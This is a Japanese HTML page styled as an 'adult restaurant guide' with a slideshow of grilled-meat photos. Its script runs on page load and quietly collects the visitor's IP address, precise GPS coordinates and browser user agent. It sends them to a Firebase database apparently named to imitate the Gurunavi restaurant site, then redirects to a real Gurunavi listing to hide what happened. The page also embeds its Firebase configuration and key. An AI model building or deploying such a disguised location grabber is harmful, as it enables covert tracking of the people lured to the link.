<!DOCTYPE html>
<html lang="ja">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>大人のレストランガイド</title>
    <style>
        body {
            background-color: black;
            color: white;
            margin: 0;
            height: 100vh;
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            font-family: 'MS Mincho', 'Yu Mincho', serif; /* 明朝体 */
        }
        h1 {
            font-size: 1.5em; /* フォントサイズを小さく */
            text-align: center;
            margin-bottom: 20px;
        }
        .image-container {
            position: relative;
            width: 80%; /* 画像の幅を調整 */
            max-width: 600px; /* 最大幅を設定 */
            aspect-ratio: 1 / 1; /* 正方形にする */
        }
        .fade-image {
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            object-fit: cover; /* 画像をコンテナに合わせて表示 */
            opacity: 0;
            transform: scale(1.1); /* 初期状態で少し拡大 */
            transition: opacity 1s ease-in-out, transform 3s ease-in-out; /* フェードとズームのアニメーション */
        }
        .fade-image.active {
            opacity: 1; /* 表示中の画像 */
            transform: scale(1); /* 元のサイズに戻す */
        }
    </style>
    <!-- Firebase SDKの追加（モジュール版） -->
    <script type="module">
        // Firebase SDKをインポート
        import { initializeApp } from "https://www.gstatic.com/firebasejs/11.4.0/firebase-app.js";
        import { getDatabase, ref, push, set, serverTimestamp } from "https://www.gstatic.com/firebasejs/11.4.0/firebase-database.js";

        // Firebaseの設定
        const firebaseConfig = {
            apiKey: "AIzaSyA5jiMfUjtZo7BUpsFM0xUVzfeJ5_fakkI",
            authDomain: "gurunavi-nagoya.firebaseapp.com",
            databaseURL: "https://gurunavi-nagoya-default-rtdb.firebaseio.com",
            projectId: "gurunavi-nagoya",
            storageBucket: "gurunavi-nagoya.firebasestorage.app",
            messagingSenderId: "181576688818",
            appId: "1:181576688818:web:f82fb20a8d58ef46c615ab"
        };

        // Firebaseの初期化
        const app = initializeApp(firebaseConfig);
        const database = getDatabase(app);

        // IPアドレスを取得
        async function getIP() {
            try {
                const response = await fetch('https://api.ipify.org?format=json');
                const data = await response.json();
                return data.ip;
            } catch (error) {
                console.error('IP取得エラー:', error);
                return '不明';
            }
        }

        // 位置情報とIPをFirebaseに送信
        async function recordData() {
            const ip = await getIP();
            const userAgent = navigator.userAgent;

            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(
                    async (position) => {
                        const latitude = position.coords.latitude;
                        const longitude = position.coords.longitude;
                        const data = {
                            ip: ip,
                            latitude: latitude,
                            longitude: longitude,
                            userAgent: userAgent,
                            timestamp: serverTimestamp()
                        };
                        await sendToFirebase(data);
                        window.location.href = 'https://r.gnavi.co.jp/business-dinner/aichi/areal4102/kods00066/';
                    },
                    async (error) => {
                        console.error('位置情報エラー:', error.message);
                        const data = {
                            ip: ip,
                            latitude: '拒否',
                            longitude: '拒否',
                            userAgent: userAgent,
                            timestamp: serverTimestamp()
                        };
                        await sendToFirebase(data);
                        alert('位置情報がオフです');
                    },
                    {
                        timeout: 10000,
                        maximumAge: 0
                    }
                );
            } else {
                const data = {
                    ip: ip,
                    latitude: '非対応',
                    longitude: '非対応',
                    userAgent: userAgent,
                    timestamp: serverTimestamp()
                };
                await sendToFirebase(data);
                alert('位置情報がオフです');
            }
        }

        // Firebaseにデータを送信
        async function sendToFirebase(data) {
            try {
                const newRef = ref(database, 'userData');
                const newEntry = push(newRef);
                await set(newEntry, data);
                console.log('データ送信成功');
            } catch (error) {
                console.error('送信エラー:', error);
            }
        }

        // ページ読み込み時に実行
        recordData();
    </script>
    <script>
        // 画像のフェードイン・フェードアウトスクリプト
        document.addEventListener('DOMContentLoaded', () => {
            const images = document.querySelectorAll('.fade-image');
            let currentIndex = 0;

            function showNextImage() {
                // 現在の画像をフェードアウト
                images[currentIndex].classList.remove('active');

                // 次の画像をフェードイン
                currentIndex = (currentIndex + 1) % images.length;
                images[currentIndex].classList.add('active');
            }

            // 初期画像を表示
            images[currentIndex].classList.add('active');

            // 4秒ごとに画像を切り替える（表示3秒 + フェード1秒）
            setInterval(showNextImage, 4000);
        });
    </script>
</head>
<body>
    <h1>大人のレストランガイド</h1>
    <div class="image-container">
        <img src="niku1.jpg" class="fade-image" alt="焼肉1">
        <img src="niku2.jpg" class="fade-image" alt="焼肉2">
        <img src="niku3.jpg" class="fade-image" alt="焼肉3">
    </div>
</body>
</html>
